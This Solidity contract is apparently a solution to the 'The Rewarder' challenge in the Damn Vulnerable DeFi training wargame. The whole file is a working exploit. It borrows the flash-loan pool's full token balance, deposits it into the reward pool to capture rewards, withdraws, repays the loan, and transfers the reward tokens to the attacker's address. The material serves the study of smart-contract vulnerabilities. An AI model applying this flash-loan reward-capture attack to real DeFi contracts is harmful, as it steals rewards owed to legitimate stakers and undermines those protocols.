// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


/**
 * @title RewarderAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract RewarderAttacker {
  FlashLoanerPool private flashLoanerPool;
  TheRewarderPool private rewardPool;
  DamnValuableToken private liquidityToken;
  RewardToken private rewardToken;


  constructor(address addressFlashLoanPool, address addressRewardPool) {
    flashLoanerPool = FlashLoanerPool(addressFlashLoanPool);
    rewardPool = TheRewarderPool(addressRewardPool);

    liquidityToken = flashLoanerPool.liquidityToken();
    rewardToken = rewardPool.rewardToken();
  }

  function attack(address attackerEOA) external {
    uint256 balance = liquidityToken.balanceOf(address(flashLoanerPool));
    flashLoanerPool.flashLoan(balance);

    uint256 balanceReward = rewardToken.balanceOf(address(this));
    rewardToken.transfer(attackerEOA, balanceReward);
  }

  function receiveFlashLoan(uint256 amount) external {
    liquidityToken.approve(address(rewardPool), amount);
    rewardPool.deposit(amount);
    rewardPool.withdraw(amount);
    liquidityToken.transfer(address(flashLoanerPool), amount);
  }

  receive() external payable {}
}